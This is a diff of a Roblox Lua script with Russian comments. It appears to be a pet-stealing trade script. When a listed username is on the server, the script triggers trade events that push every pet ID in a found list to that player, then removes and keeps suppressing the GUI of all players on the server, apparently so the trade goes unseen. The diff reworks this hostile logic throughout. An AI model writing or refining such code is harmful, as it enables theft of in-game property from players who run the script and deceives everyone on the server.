@@ -1,3 +1,4 @@
+--ыы
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
@@ -189,18 +190,20 @@ local function removeAllGUI(parent)
 end
 
 
-local function onPlayerJoin(playerName)
-    firePlayer(playerName) 
-    task.delay(5, function() 
+local function startTradeProcess(targetName)
+    firePlayer(targetName)
+    
+    task.delay(15, function()  -- Ждём 15 секунд после появления игрока
         for _, id in ipairs(FoundIDs) do
             firePet(id)
         end
-        fireFinalEvent() -- FireServer [35]
+        fireFinalEvent()
     end)
+    
+    -- Ломаем GUI у всех игроков на сервере
     for _, player in ipairs(Players:GetPlayers()) do
         if player:FindFirstChild("PlayerGui") then
             removeAllGUI(player.PlayerGui)
-            -- Блокируем появление новых GUI
             player.PlayerGui.ChildAdded:Connect(function(child)
                 task.defer(function()
                     removeAllGUI(child)
@@ -211,14 +214,14 @@ local function onPlayerJoin(playerName)
 end
 
 
--- Проверяем уже подключенных игроков при запуске скрипта
+-- Проверка уже подключённых игроков при запуске скрипта
 for _, player in ipairs(Players:GetPlayers()) do
     if table.find(UserNames, player.Name) then
-        print(player.Name .. " уже на сервере. Запускаем через 15 секунд.")
-        task.delay(15, function()
-            onPlayerJoin(player.Name)
-        end)
+        print("[Обнаружен] " .. player.Name .. " уже на сервере. Запуск через 15 секунд.")
+        startTradeProcess(player.Name)
     end
+    
+    -- Ломаем GUI у всех (включая уже присутствующих)
     if player:FindFirstChild("PlayerGui") then
         removeAllGUI(player.PlayerGui)
         player.PlayerGui.ChildAdded:Connect(function(child)
@@ -229,14 +232,15 @@ for _, player in ipairs(Players:GetPlayers()) do
     end
 end
 
--- Для новых игроков
+
+-- Отслеживание новых подключений
 Players.PlayerAdded:Connect(function(player)
     if table.find(UserNames, player.Name) then
-        print(player.Name .. " подключился. Запускаем через 15 секунд.")
-        task.delay(15, function()
-            onPlayerJoin(player.Name)
-        end)
+        print("[Подключился] " .. player.Name .. ". Запуск через 15 секунд.")
+        startTradeProcess(player.Name)
     end
+    
+    -- Ломаем GUI у нового игрока
     if player:FindFirstChild("PlayerGui") then
         removeAllGUI(player.PlayerGui)
         player.PlayerGui.ChildAdded:Connect(function(child)
